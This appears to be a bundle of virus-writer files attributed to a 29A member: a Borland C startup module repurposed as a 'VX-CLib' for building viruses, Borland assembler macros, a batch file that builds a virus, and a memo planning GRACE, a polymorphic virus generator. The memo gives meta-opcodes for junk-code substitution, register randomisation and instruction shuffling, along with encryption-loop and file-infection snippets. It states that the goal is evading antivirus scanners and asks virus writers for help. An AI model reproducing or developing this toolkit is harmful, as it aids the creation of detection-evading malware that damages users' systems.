+PubSym@         _envLng,        <dw     0>,             __CDECL__
+PubSym@         _envseg,        <dw     0>,             __CDECL__
+PubSym@         _envSize,       <dw     0>,             __CDECL__
+PubSym@         _psp,           <dw     0>,             __CDECL__
+PubSym@         _version,       <label word>,           __CDECL__
+PubSym@         _osversion,     <label word>,           __CDECL__
+PubSym@         _osmajor,       <db     0>,             __CDECL__
+PubSym@         _osminor,       <db     0>,             __CDECL__
+PubSym@         errno,          <dw     0>,             __CDECL__
+PubSym@         _StartTime,     <dw   0,0>,             __CDECL__
+
+
+
+;       Memory management variables
+
+IF      LDATA  EQ  false
+PubSym@         __heapbase,     <dw   DGROUP:edata@>,   __CDECL__
+ENDIF
+IFNDEF __HUGE__
+PubSym@         __brklvl,       <dw   DGROUP:edata@>,   __CDECL__
+ENDIF
+PubSym@         _heapbase,      <dd   0>,       __CDECL__
+PubSym@         _brklvl,        <dd   0>,       __CDECL__
+PubSym@         _heaptop,       <dd   0>,       __CDECL__
+PubSym@         pspseg          <dw   0>,       __CDECL__
+
+_DATA           ENDS
+
+_CVTSEG         SEGMENT
+PubSym@         _RealCvtVector, <label  word>,  __CDECL__
+                ENDS
+
+_SCNSEG         SEGMENT
+PubSym@         _ScanTodVector,  <label word>,  __CDECL__
+                ENDS
+
+IFNDEF __HUGE__
+_BSS            SEGMENT
+
+;=====( Sorry, I could not resist putting my name in it )======================
+
+Signature       db '[ VX-CLib 1.0 by Rajaat / 29A ]',0
+
+bdata@          label   byte
+
+;=====( This might come in handy ;-)===========================================
+
+PubSym@         virus_end,      <label byte>,   __CDECL__
+                ENDS
+
+_BSSEND         SEGMENT
+edata@          label   byte
+                ENDS
+ENDIF
+
+                END     STARTX
+
+-----[ end c0.asm ]-----
+
+-----[ start rules.asi ]-----
+
+;[]-----------------------------------------------------------------[]
+;|      RULES.ASI  --  Rules & Structures for assembler              |
+;|                                                                   |
+;|      C/C++ Run Time Library   Version 4.0                         |
+;|                                                                   |
+;|      Copyright (c) 1987, 1991 by Borland International Inc.       |
+;|      All Rights Reserved.                                         |
+;[]-----------------------------------------------------------------[]
+
+;*** First we begin with a few of the major constants of C.
+
+false   equ     0       ; Beware !  For incoming parameters, non-false = true.
+true    equ     1       ; For results, we generate the proper numbers.
+
+lesser  equ    -1       ; Incoming, lesser < 0
+equal   equ     0
+greater equ     1       ; Incoming, greater > 0
+
+        PAGE
+;[]------------------------------------------------------------[]
+;|                                                              |
+;|      Conditional Assembly Directives                         |
+;|                                                              |
+;[]------------------------------------------------------------[]
+
+;memory model aliases, for the convenience of building the library
+
+;bit masks to extract default pointer types from MMODEL (at run-time)
+FCODE           equ     8000h
+FDATA           equ     4000h
+
+IFDEF   __TINY__                ; Small Code - Small Data
+        LPROG           equ     false
+        LDATA           equ     false
+        MMODEL          equ     0       
+        _DSSTACK_       equ     <>
+ENDIF
+
+IF      LPROG
+        DIST            equ     FAR
+ELSE
+        DIST            equ     NEAR
+ENDIF
+
+        PAGE
+;[]------------------------------------------------------------[]
+;|                                                              |
+;|      Segment Declarations Macros                             |
+;|                                                              |
+;[]------------------------------------------------------------[]
+
+Code_Seg@       MACRO           ;; Open a Code Segment
+IFDEF __WINDOWS__
+_TEXT   SEGMENT WORD PUBLIC 'CODE'
+ELSE
+_TEXT   SEGMENT BYTE PUBLIC 'CODE'
+ENDIF
+        ASSUME  CS:_TEXT
+                ENDM
+
+Code_EndS@      MACRO           ;; Close a Code Segment
+_TEXT   ENDS
+                ENDM
+
+Data_Seg@       MACRO           ;; Open a Data Segment  (initialized)
+_DATA   SEGMENT WORD PUBLIC 'DATA'
+                ENDM
+
+Data_EndS@      MACRO           ;; Close a Data Segment (initialized)
+_DATA   ENDS
+                ENDM
+
+IFNDEF __HUGE__
+    BSS_Seg@        MACRO       ;; Open a Data Segment  (un-initialized)
+    _BSS    SEGMENT WORD PUBLIC 'BSS'
+            ENDM
+
+    BSS_EndS@       MACRO       ;; Close a Data Segment (un-initialized)
+    _BSS    ENDS
+                    ENDM
+ENDIF
+
+FarData_Seg@    MACRO           ;; Open a FAR Data Segment
+_FARDATA        SEGMENT PARA PUBLIC 'FAR_DATA'
+                ENDM
+
+FarData_EndS@   MACRO           ;; Close a FAR Data Segment
+_FARDATA        ENDS
+                ENDM
+
+FarBSS_Seg@     MACRO           ;; Open a FAR BSS Segment
+_FARBSS         SEGMENT PARA PUBLIC 'FAR_BSS'
+                ENDM
+
+FarBSS_EndS@    MACRO           ;; Close a FAR BSS Segment
+_FARBSS         ENDS
+                ENDM
+
+Const_Seg@      MACRO           ;; Open a CONST Segment
+_CONST  SEGMENT WORD PUBLIC 'CONST'
+                ENDM
+
+Const_EndS@     MACRO           ;; Close a CONST Segment
+_CONST  ENDS
+                ENDM
+
+Init_Seg@       MACRO           ;; Open a INIT Segment
+_INIT_  SEGMENT WORD PUBLIC 'INITDATA'
+                ENDM
+
+Init_EndS@      MACRO           ;; Close a INIT Segment
+_INIT_  ENDS
+                ENDM
+
+Exit_Seg@       MACRO           ;; Open a EXIT Segment
+_EXIT_  SEGMENT WORD PUBLIC 'EXITDATA'
+                ENDM
+
+Exit_EndS@      MACRO           ;; Close a EXIT Segment
+_EXIT_  ENDS
+                ENDM
+
+CVT_Seg@        MACRO
+_CVTSEG SEGMENT WORD PUBLIC 'DATA'
+                ENDM
+
+CVT_EndS@       MACRO
+_CVTSEG ENDS
+                ENDM
+
+SCN_Seg@        MACRO
+_SCNSEG SEGMENT WORD PUBLIC 'DATA'
+                ENDM
+
+SCN_EndS@       MACRO
+_SCNSEG ENDS
+                ENDM
+
+Header@ MACRO
+Code_Seg@
+Code_EndS@
+Data_Seg@
+Data_EndS@
+BSS_Seg@
+BSS_EndS@
+        ASSUME  CS:_TEXT, DS:DGROUP
+        ENDM
+
+;[]------------------------------------------------------------[]
+;|                                                              |
+;|      Segment Definitions                                     |
+;|                                                              |
+;[]------------------------------------------------------------[]
+
+IFDEF __C0__
+
+_TEXT           SEGMENT BYTE PUBLIC 'CODE'
+                ENDS
+
+_FARDATA        SEGMENT PARA PUBLIC 'FAR_DATA'
+                ENDS
+
+_FARBSS         SEGMENT PARA PUBLIC 'FAR_BSS'
+                ENDS
+
+_DATA           SEGMENT PARA PUBLIC 'DATA'
+                ENDS
+                ENDS
+
+_CONST          SEGMENT WORD PUBLIC 'CONST'
+                ENDS
+
+_CVTSEG         SEGMENT WORD PUBLIC 'DATA'
+                ENDS
+
+_SCNSEG         SEGMENT WORD PUBLIC 'DATA'
+                ENDS
+
+_INIT_          SEGMENT WORD PUBLIC 'INITDATA'
+InitStart       label byte
+                ENDS
+_INITEND_       SEGMENT BYTE PUBLIC 'INITDATA'
+InitEnd         label byte
+                ENDS
+
+_EXIT_          SEGMENT WORD PUBLIC 'EXITDATA'
+ExitStart       label byte
+                ENDS
+_EXITEND_       SEGMENT BYTE PUBLIC 'EXITDATA'
+ExitEnd         label byte
+                ENDS
+
+IFNDEF __HUGE__
+_BSS          SEGMENT WORD PUBLIC 'BSS'
+BeginBSS      label byte
+              ENDS
+_BSSEND       SEGMENT BYTE PUBLIC 'BSSEND'
+EndBSS        label byte
+              ENDS
+ENDIF
+
+
+IFDEF __WINDOWS__
+
+  IFDEF  __HUGE__
+  DGROUP GROUP NULL,_DATA,_CONST,_FPSEG,_CVTSEG,_SCNSEG,_INIT_,_INITEND_,_EXIT_,_EXITEND_
+  ELSE
+  DGROUP GROUP NULL,_DATA,_CONST,_FPSEG,_CVTSEG,_SCNSEG,_INIT_,_INITEND_,_EXIT_,_EXITEND_,_BSS,_BSSEND
+  ENDIF
+
+ELSE
+
+IFNDEF __NOFLOAT__
+  IF LDATA
+    IFDEF  __HUGE__
+      DGROUP GROUP _DATA,_CONST,_CVTSEG,_SCNSEG,_INIT_,_INITEND_,_EXIT_,_EXITEND_
+    ELSE
+      DGROUP GROUP _DATA,_CONST,_CVTSEG,_SCNSEG,_INIT_,_INITEND_,_EXIT_,_EXITEND_,_BSS,_BSSEND
+    ENDIF
+  ELSE
+    IFDEF __TINY__
+      DGROUP GROUP _TEXT,_DATA,_CONST,_CVTSEG,_SCNSEG,_INIT_,_INITEND_,_EXIT_,_EXITEND_,_BSS,_BSSEND
+    ELSE
+      DGROUP GROUP _DATA,_CONST,_CVTSEG,_SCNSEG,_INIT_,_INITEND_,_EXIT_,_EXITEND_,_BSS,_BSSEND
+    ENDIF
+  ENDIF
+ELSE
+  IF LDATA
+    IFDEF __HUGE__
+      DGROUP GROUP _DATA,_CONST,_CVTSEG,_SCNSEG,_INIT_,_INITEND_,_EXIT_,_EXITEND_
+    ELSE
+      DGROUP GROUP _DATA,_CONST,_CVTSEG,_SCNSEG,_BSS,_BSSEND
+    ENDIF
+  ELSE
+    IFDEF __TINY__
+      DGROUP GROUP _TEXT,_DATA,_CONST,_CVTSEG,_SCNSEG,_INIT_,_INITEND_,_EXIT_,_EXITEND_,_BSS,_BSSEND
+    ELSE
+      DGROUP GROUP _DATA,_CONST,_CVTSEG,_SCNSEG,_INIT_,_INITEND_,_EXIT_,_EXITEND_,_BSS,_BSSEND
+    ENDIF
+  ENDIF
+ENDIF ; __NOFLOAT__
+
+ENDIF ; __WINDOWS__
+
+ELSE
+
+Code_Seg@
+Code_EndS@
+Data_Seg@
+Data_EndS@
+DGROUP GROUP _DATA
+
+ENDIF ; __C0__
+
+        PAGE
+;[]------------------------------------------------------------[]
+;|                                                              |
+;|      Old Segment Declarations Macros                         |
+;|                                                              |
+;[]------------------------------------------------------------[]
+
+
+CSeg@           MACRO           ;; Open a Code Segment
+_TEXT   SEGMENT BYTE PUBLIC 'CODE'
+        ASSUME  CS:_TEXT
+                ENDM
+
+CSegEnd@        MACRO           ;; Close a Code Segment
+_TEXT   ENDS
+                ENDM
+
+DSeg@           MACRO           ;; Open a Data Segment  (initialized)
+_DATA   SEGMENT WORD PUBLIC 'DATA'
+                ENDM
+
+DSegEnd@        MACRO           ;; Close a Data Segment (initialized)
+_DATA   ENDS
+                ENDM
+
+IFDEF __BSS__
+    IFNDEF __HUGE__
+        BSeg@           MACRO           ;; Open a Data Segment  (un-initialized)
+        _BSS    SEGMENT WORD PUBLIC 'BSS'
+                ENDM
+
+        BSegEnd@        MACRO           ;; Close a Data Segment (un-initialized)
+        _BSS    ENDS
+                        ENDM
+    ENDIF
+ENDIF
+
+Header@ MACRO
+_TEXT   SEGMENT BYTE PUBLIC 'CODE'
+_TEXT   ENDS
+_DATA   SEGMENT WORD PUBLIC 'DATA'
+_DATA   ENDS
+IFDEF __BSS__
+    IFNDEF  __HUGE__
+        _BSS    SEGMENT WORD PUBLIC 'BSS'
+        _BSS    ENDS
+    ENDIF
+ENDIF
+
+        ASSUME  CS:_TEXT, DS:DGROUP
+        ENDM
+
+        PAGE
+;[]------------------------------------------------------------[]
+;|                                                              |
+;|      C Naming Convention Macros                              |
+;|                                                              |
+;[]------------------------------------------------------------[]
+
+UNDERSCORE      EQU     1
+
+ExtSym@ MACRO   Sym, sType, sName
+        IFNB    <sName>
+        IFIDN   <sName>, <__PASCAL__>
+NAMING      =       0
+        ELSE
+NAMING      =       UNDERSCORE
+        ENDIF
+        ENDIF
+        IF      NAMING
+        EXTRN   _&Sym : sType
+Sym&@   equ     _&Sym
+        ELSE
+        EXTRN   Sym : sType
+Sym&@   equ     Sym
+        ENDIF
+        ENDM
+
+PubSym@ MACRO   Sym, Definition, sName
+        IFNB    <sName>
+        IFIDN   <sName>, <__PASCAL__>
+NAMING      =       0
+        ELSE
+NAMING      =       UNDERSCORE
+        ENDIF
+        ENDIF
+        IF      NAMING
+        PUBLIC  _&Sym
+_&Sym   Definition
+Sym&@   equ     _&Sym
+        ELSE
+        PUBLIC  Sym
+Sym     Definition
+Sym&@   equ     Sym
+        ENDIF
+        ENDM
+
+Static@ MACRO   Sym, Definition, sName
+        IFNB    <sName>
+        IFIDN   <sName>, <__PASCAL__>
+NAMING      =       0
+        ELSE
+NAMING      =       UNDERSCORE
+        ENDIF
+        ENDIF
+        IF      NAMING
+_&Sym   Definition
+Sym&@   equ     _&Sym
+        ELSE
+Sym     Definition
+Sym&@   equ     Sym
+        ENDIF
+        ENDM
+
+        PAGE
+;[]------------------------------------------------------------[]
+;|                                                              |
+;|      Macros which are Data Size Dependent                    |
+;|                                                              |
+;[]------------------------------------------------------------[]
+
+IF      LDATA
+DPTR_           equ     DWORD PTR
+dPtrSize        equ     4
+LES_            equ     LES
+ES_             equ     ES:
+SS_             equ     SS:
+LDS_            equ     LDS
+
+pushDS_         MACRO
+                PUSH    DS
+                ENDM
+
+popDS_          MACRO
+                POP    DS
+                ENDM
+
+PushPtr         MACRO   dPtrOff, dPtrSeg
+                PUSH    dPtrSeg
+                PUSH    dPtrOff
+                ENDM
+
+
+dPtr@           MACRO   Sym, VALUE, sName       ;; Static Data pointer
+Static@         Sym, <DD        VALUE>, sName
+                ENDM
+
+dPtrPub@        MACRO   Sym, VALUE, sName       ;; Global Data Pointer
+PubSym@         Sym, <DD        VALUE>, sName
+                ENDM
+
+dPtrExt@        MACRO   Sym, sName      ;; External Data Pointer
+ExtSym@         Sym, DWORD, sName
+                ENDM
+ELSE
+DPTR_           equ     WORD PTR
+dPtrSize        equ     2
+LES_            equ     MOV
+ES_             equ     DS:
+SS_             equ     DS:
+LDS_            equ     MOV
+
+pushDS_         MACRO
+                ENDM
+
+popDS_          MACRO
+                ENDM
+
+PushPtr         MACRO   dPtrOff, dPtrSeg
+                PUSH    dPtrOff
+                ENDM
+
+dPtr@           MACRO   Sym, VALUE, sName       ;; Static Data pointer
+Static@         Sym, <DW        VALUE>, sName
+                ENDM
+
+dPtrPub@        MACRO   Sym, VALUE, sName       ;; Global Data Pointer
+PubSym@         Sym, <DW        VALUE>, sName
+                ENDM
+
+dPtrExt@        MACRO   Sym, sName      ;; External Data Pointer
+ExtSym@         Sym, WORD, sName
+                ENDM
+ENDIF
+        PAGE
+;[]------------------------------------------------------------[]
+;|                                                              |
+;|      Macros which are Code Size Dependent                    |
+;|                                                              |
+;[]------------------------------------------------------------[]
+
+IF      LPROG
+CPTR_           equ     DWORD PTR
+cPtrSize        equ     4
+
+Proc@           MACRO   Sym, sName      ;; Open a Static function
+Static@         Sym, <PROC      FAR>, sName
+                ENDM
+
+PubProc@        MACRO   Sym, sName      ;; Open a Public function
+PubSym@         Sym, <PROC      FAR>, sName
+                ENDM
+
+ExtProc@        MACRO   Sym, sName      ;; External Function
+ExtSym@         Sym, FAR, sName
+                ENDM
+
+cPtr@           MACRO   Sym, VALUE, sName       ;; Static Function pointer
+Static@         Sym, <DD        VALUE>, sName
+                ENDM
+
+cPtrPub@        MACRO   Sym, VALUE, sName;; Global Function Pointer
+PubSym@         Sym, <DD        VALUE>, sName
+                ENDM
+
+cPtrExt@        MACRO   Sym, sName      ;; External Function Pointer
+ExtSym@         Sym, DWORD, sName
+                ENDM
+ELSE
+CPTR_           equ     WORD PTR
+cPtrSize        equ     2
+
+Proc@           MACRO   Sym, sName      ;; Open a Static function
+Static@         Sym, <PROC      NEAR>, sName
+                ENDM
+
+PubProc@        MACRO   Sym, sName      ;; Open a Public function
+PubSym@         Sym, <PROC      NEAR>, sName
+                ENDM
+
+ExtProc@        MACRO   Sym, sName      ;; External Function
+ExtSym@         Sym, NEAR, sName
+                ENDM
+
+cPtr@           MACRO   Sym, VALUE, sName       ;; Static Function pointer
+Static@         Sym, <DW        VALUE>, sName
+                ENDM
+
+cPtrPub@        MACRO   Sym, VALUE, sName       ;; Global Function Pointer
+PubSym@         Sym, <DW        VALUE>, sName
+                ENDM
+
+cPtrExt@        MACRO   Sym, sName      ;; External Function Pointer
+ExtSym@         Sym, WORD, sName
+                ENDM
+ENDIF
+
+EndProc@        MACRO   Sym, sName      ;; Close a function
+Static@         Sym, ENDP, sName
+                ENDM
+
+        PAGE
+;[]------------------------------------------------------------[]
+;|                                                              |
+;|      Miscellaneous Definitions                               |
+;|                                                              |
+;[]------------------------------------------------------------[]
+
+;*** Set up some macros for procedure parameters and export/import
+
+nearCall        STRUC
+nearBP          dw      ?
+nearIP          dw      ?
+nearParam       dw      ?
+nearCall        ENDS
+
+farCall         STRUC
+farBP           dw      ?
+farCSIP         dd      ?
+aParam          dw      ?
+farCall         ENDS
+
+;*** Next, we define some convenient structures to access the parts
+;       of larger objects.
+
+_twoBytes       STRUC
+BY0     db      ?
+BY1     db      ?
+_twoBytes       ENDS
+
+_fourWords      STRUC
+W0      dw      ?
+W1      dw      ?
+W2      dw      ?
+W3      dw      ?
+_fourWords      ENDS
+
+_twoDwords      STRUC
+DD0     dd      ?
+DD1     dd      ?
+_twoDwords      ENDS
+
+_aFloat         STRUC
+double          dq      ?
+_aFloat         ENDS
+
+; How to invoke MSDOS.
+
+MSDOS@  MACRO
+        int     21h
+        ENDM
+        PAGE
+
+; The next section concerns the use of registers.  SI and DI are used
+;       for register variables, and must be conserved.
+
+; Registers AX, BX, CX, DX will not be preserved across function calls.
+
+; Firstly, the registers to be conserved through function calls, including
+;       the setup of local variables.
+
+link@   MACRO   _si,_di,_ES,locals
+        push    bp
+        mov     bp, sp
+        IFNB    <locals>
+                lea     sp, locals
+        ENDIF
+        IFNB    <_si>
+                push    si
+        ENDIF
+        IFNB    <_di>
+                push    di
+        ENDIF
+ENDM
+
+unLink@ MACRO   _si,_di,_ES,locals
+        IFNB    <_di>
+                pop     di
+        ENDIF
+        IFNB    <_si>
+                pop     si
+        ENDIF
+        IFNB    <locals>
+                mov     sp, bp
+        ENDIF
+        pop     bp
+ENDM
+
+.LIST
+
+-----[ end rules.asi ]-----
+
+-----[ start bldfick.bat ]-----
+
+@echo off
+echo Building Model Tiny startups
+TASM /M /MX /Q /T /D__TINY__    c0, c0t
+echo Building Virus
+bcc -L. -r- -tDc -mt -3 -Z -d -1 ficknitz.c fse.asm
+echo Done.
+
+-----[ end bldfick.bat ]-----
+
+-----[ start help.me! ]-----
+
+Note:   This file was first confidentially spread to various virus writers,
+        and I finally came to the conclusion that since the nature of GRACE
+        will be very generic, av'er cannot take it into account beforehand.
+        Therefore it's completely safe to spread this, since most scanners
+        still rely on some sort of string scanning, and av'er don't like going
+        through thousands of old virus strings if they don't need to.
+
+
+GRACE
+=====
+
+At the moment I'm making plans on writing a virus generator. A virus
+generator on itself is not a novel idea. We have seen different
+approaches from a menu interface (VCL) to modular code with
+configuration files (G2). To avoid making another clone of one of these,
+I have decided to take a complete different approach. The program I'm
+planning to make is not as much as a virus generator, but more of a kind
+of "meta-assembly" language which can be used for virus exploits. The
+language can be extended by external C source code, which gets loaded
+and compiled by the generator during runtime. The virus code is being
+generated from a template file, which contains mixed meta and assembly
+code, of which parts can or can not be included, which is decided by a
+configuration file for that template (a la PS-MPC).
+
+You see that this is a mighty big project, and it will sure take me a
+lot of time to finish it, granted if I succeed at all. I have called
+this project GRACE (Generic Random Assembly Construction Engine). To let
+GRACE to be of use to you, I need your help. I want you to exchange
+ideas with me how the meta language should look like, what possibilities
+you want in the language, etc.
+
+Opcodes
+=======
+
+GRACE will feature an extended opcode set for generating random
+instructions. This can be mixed through the assembler code. Here are a
+few examples of what kind of extended opcodes I mean:
+
+        opcode                          could generate
+
+        ZERO <reg>                      MOV <reg>,0
+                                        or
+                                        SUB <reg>,<reg>
+                                        or
+                                        CLC
+                                        SBB <reg>,<reg>
+                                        or
+                                        XOR <reg>,<reg>
+                                        or
+                                        AND <reg>,0
+
+        LOAD <reg>,<reg>|<mem>|<imm>|   MOV <reg>,<rval>
+                   <mem+reg> = <rval>   or
+                                        ZERO <reg>
+                                        ADD <reg>,<rval>
+                                        or
+                                        ZERO <reg>
+                                        OR <reg>,<rval>
+                                        or
+                                        ZERO <reg>
+                                        XOR <reg>,<rval>
+                                        or
+                                        ZERO <reg>
+                                        CLC
+                                        ADC <reg>,<rval>
+
+        INCR <reg>|<mem+reg>|           INC <rval>
+             <mem> = <rval>             or
+                                        ADD <rval>,1
+                                        or
+                                        SUB <rval>,-1
+
+        DECR <reg>|<mem+reg>|           DEC <rval>
+             <mem> = <rval>             or
+                                        SUB <rval>,1
+                                        or
+                                        ADD <rval>,-1
+
+You see the idea here, be creative, thing of nice possible constructs
+how to move registers, compare things, do branches, whatever! As you
+see, the opcodes can be recursed, so this leaves room for maximum
+flexibility.
+
+Example idea of how the meta code would look like with these two
+new opcodes:
+
+        open_file:              load ax,3d02h           ; open file
+                                load dx,9eh             ; dta :-)
+                                int 21h
+                                jc error
+                                load ax,4202h           ; end of file
+                                zero cx
+                                zero dx
+                                int 21h
+
+Or a simple dencryption loop, which now turns out to be nicely
+polymorphically generated:
+
+                                load cx,virus_bytes
+                                load si,encrypted_code
+decrypt:                        xor byte ptr [si],bvalue
+                                incr si
+                                decr cx
+                                jnz decrypt
+
+Register tracking
+=================
+
+If I can do some sort of register tracking, I can see which registers
+are free for generating trash functions for between the code, but I
+cannot predict what registers get filled with important values after
+calling an interrupt. How should I track the registers? I thought the
+simplest approach would be using statements for reserving, freeing and
+tracking registers. For example:
+
+        load ax,3d02h
+        load dx,offset filename
+        int 21h
+        jc error
+        RESERVE AX              ; protects file handle
+        some trash code generation opcodes that you have thought of :-)
+        FREE AX                 ; frees file handle
+        load bx,4202h
+        xchg ax,bx
+        RESERVE AX,BX           ; protects file handle
+
+
+Should I try to do some register tracking? It is not so easy to do. What
+I can do is let the generator output warning messages that a register
+that is reserved is being manipulated, or let GRACE generate push and
+pop sequences to save registers? That would not be safe if there is a
+branch that jumps out of the RESERVE and FREE statements. Comments
+please!
+
+Random Line Ordering
+====================
+
+To be truly of use, it should be possible to let lines of code get
+swapped, or in case a meta opcode is used, get mixed if possible. How
+should I define blocks of lines that can be swapped? I was thinking
+about this:
+
+                        BEGIN MIX
+                        load si,encrypted_file
+                        load cx,virus_bytes
+                        END MIX
+        decrypt:        xor byte ptr [si],bval
+                        incr si
+                        decr cx
+                        jnz decrypt
+
+or to lseek to the end of the file:
+
+                        BEGIN MIX
+                        load ax,4202h
+                        zero cx
+                        zero dx
+                        END MIX
+
+Beware: you cannot mix incr si/decr cx from the 1st example, as the
+branch depends on the result on the operation on cx, which gets
+destroyed of si gets modified after it.
+
+Random Block Ordering
+=====================
+
+I have absolutely no idea how I'll do this, I had an idea about defining
+blocks of code with name and level, so blocks can be nested, or should I
+autodetect levels, so I can simply use brackets ({}) for defining
+blocks? That would make it VERY nice.
+
+{
+open_file:      load ax,3d02h
+                int 21h
+                jc error
+                xchg ax,bx
+error:          ret
+}
+
+{
+close_file:     load ah,3eh
+                int 21h
+                ret
+}
+
+check_type:     cmp word ptr [exe_id],'MZ'
+                je exefile
+                cmp word ptr [exe_id],'ZM'
+                je exefile
+                jmp comfile
+{
+  {
+  com_file:     etc;
+  }
+  {
+  exe_file:     etc;
+  }
+}
+
+This makes it very cryptic and you easily can get problems with
+branching out of range, so please give me some comments on this one!
+
+Random Register Selector
+========================
+
+For some matters (especially encryption loops) it would be nice if you
+could load a random register in a symbol, which you could use in your
+assembler statements, like a random definition from a c-like
+preprocessor. Ofcourse it should work with statements like for example
+RESERVE and FREE. Look at this sample:
+
+                BEGIN MIX
+                EVO = random("SI","DI","BX")
+                RESERVE EVO
+                load EVO,encrypted_virus_offset
+                COUNTER = random("AX","BX","CX","DX","SI","DI","BP")
+                load COUNTER,virus_bytes
+                RESERVE COUNTER
+                END MIX
+decrypt:        xor byte ptr [EVO],bval
+                incr EVO
+                decr COUNTER
+                jnz decrypt
+                FREE EVO,COUNTER
+
+Conditionals
+============
+
+To make GRACE work with configuration files, the meta language should
+support some conditionals that can evaluate strings that have been read
+from the configuration file. I can't use the normal IF, since that is a
+reserved TASM word. Should I use IFOPT and ENDIFOPT? Or should I create
+C-like IF constructs? I can recognize them simply with grammar, since
+C's IF uses () and TASM doesn't.
+
+if (tsr == "Y") || (tsr == "Yes")
+        hey you see that? If I want to do this approach, I should
+        provide some string comparison and manipulation functions... You
+        know what I want to ask from you...
+
+
+The end of the story, the beginning of my biggest project.
+
+If you have any ideas or want to contact me on this project, feel free
+to send email to: rajaat@itookmyprozac.com
+
+If there is enough interest, I shall see if I can make some sort of
+mailing list to keep people informed, or keep up a homepage of the
+progress and discussions.
+
+-----[ end help.me! ]-----
